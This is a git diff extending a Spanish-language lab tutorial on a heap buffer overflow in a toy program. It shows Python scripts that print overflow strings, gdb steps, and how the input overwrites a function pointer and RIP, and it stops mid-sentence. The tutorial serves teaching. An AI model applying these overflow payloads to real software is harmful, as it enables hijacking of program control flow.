@@ -131,5 +131,34 @@ Donde vemos que el número máximo de carácteres que podemos insertar es
 0x4052f0 (donde empieza fesperofuera) - 0x4052a0 (donde empieza el buffer) = 80
 ```
 
-Por tanto, vamos a ver que pasa 
+Por tanto, vamos a ver que pasa al introducir una cadena de este tamaño con el siguiente programa de python:
+```
+program.2:
+#!/usr/bin/python3
+print('X' * 70 + 'YAYBYCYDYEYFYG')
+```
+De forma que deberíamos prestar especial atencion a la última parte de la cadena "YFYG" = 0x47594659. Vamos a ver donde se sobreescribe esto ejecutando:
+```
+gdb -q ./heapexample
+(gdb) run $(./pp2)
+```
+Y analicemos la memoria en el heap:
 
+![image](https://github.com/user-attachments/assets/34b01a17-d6d2-488f-a2d5-2de408f73f66)
+
+Donde podemos ver que hemos sobreescrito la zona de la funcion fesperofuera con la cadena "0x47594659" = YFYG (little endian).
+
+Por otro lado, tras ejecutar con esta entrada si observamos los registros del sistema con:
+```
+info registers
+```
+vemos que hemos sobreescrito el RIP con esta cadena:
+![image](https://github.com/user-attachments/assets/32f202a6-1c07-4c59-8ab4-3aeb843ac220)
+
+¿C
+
+```
+program.3:
+#!/usr/bin/python3
+print('X' * 80 + 'CDEF')
+```
